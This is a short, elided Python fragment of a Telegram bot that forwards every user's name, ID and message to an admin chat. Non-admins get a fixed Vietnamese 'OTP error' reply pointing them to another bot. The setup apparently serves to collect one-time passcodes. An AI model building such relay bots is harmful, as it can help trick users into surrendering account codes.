...
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN_11")
...
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "OTP lỗi vui lòng liên hệ https://t.me/b52_otpbot")
...
def from_user(message):
    ...
    sent = bot.send_message(ADMIN_ID, f"[BOT 11] {name} (ID: {user.id}): {message.text}")
